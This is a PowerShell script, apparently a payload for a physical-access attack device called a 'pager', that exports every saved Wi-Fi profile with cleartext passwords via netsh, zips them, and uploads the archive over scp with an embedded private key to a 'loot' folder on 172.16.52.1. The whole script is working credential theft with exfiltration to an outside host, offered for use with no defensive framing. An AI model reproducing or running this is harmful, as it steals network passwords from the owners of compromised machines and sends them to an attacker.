# Creates a dir named wifi in the %TEMP% dir
mkdir "$env:TEMP\wifi"

#Exports all wifi credentials
netsh wlan show profiles

# Dumps all wifi credentials to seperate .xml files
netsh wlan export profile key=clear folder="$env:TEMP\wifi"

# Creats an archive of all files named wifi.zip in %TEMP%\wifi
Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force #

# wifi pager scp upload cmd using public key instead of password to upload to pager
$ErrorActionPreference = "Stop"

# ---- CONFIG ----
$PagerIP   = "172.16.52.1"
$PagerUser = "root"
$LocalFile = Join-Path $env:TEMP "wifi\wifi.zip"
$RemoteDir = "/mmc/root/loot/wifi/"
$TempKey   = Join-Path $env:TEMP ("pager_key_" + [guid]::NewGuid().ToString())

# ---- PASTE BASE64 OF YOUR WORKING PRIVATE KEY FILE BELOW ----
$PrivateKeyB64 = @'
AUTHORIZED KEY HERE
'@

function Test-CommandExists {
    param([string]$Name)
    [bool](Get-Command $Name -ErrorAction SilentlyContinue)
}

try {
    if (-not (Test-Path $LocalFile)) {
        throw "File not found: $LocalFile"
    }

    if (-not (Test-CommandExists "scp")) {
        throw "scp not found in PATH"
    }

    if (-not (Test-CommandExists "ssh-keygen")) {
        throw "ssh-keygen not found in PATH"
    }

    $keyBytes = [Convert]::FromBase64String(($PrivateKeyB64 -replace '\s',''))
    [IO.File]::WriteAllBytes($TempKey, $keyBytes)

    if (-not (Test-Path $TempKey)) {
        throw "Failed to create temporary key file"
    }

    icacls $TempKey /inheritance:r | Out-Null
    icacls $TempKey /grant:r "$($env:USERNAME):(R)" | Out-Null

    & ssh-keygen -y -f $TempKey | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "Embedded private key is invalid or unreadable"
    }

    & ssh-keygen -R $PagerIP | Out-Null 2>$null

    & scp `
        -i $TempKey `
        -o StrictHostKeyChecking=accept-new `
        -o IdentitiesOnly=yes `
        $LocalFile `
        "${PagerUser}@${PagerIP}:${RemoteDir}"

    if ($LASTEXITCODE -ne 0) {
        throw "scp failed with exit code $LASTEXITCODE"
    }

    Write-Host "Upload SUCCESS: $LocalFile -> ${PagerUser}@${PagerIP}:${RemoteDir}"
}
catch {
    Write-Error $_.Exception.Message
    exit 1
}
finally {
    if (Test-Path $TempKey) {
        Remove-Item $TempKey -Force -ErrorAction SilentlyContinue
    }
}
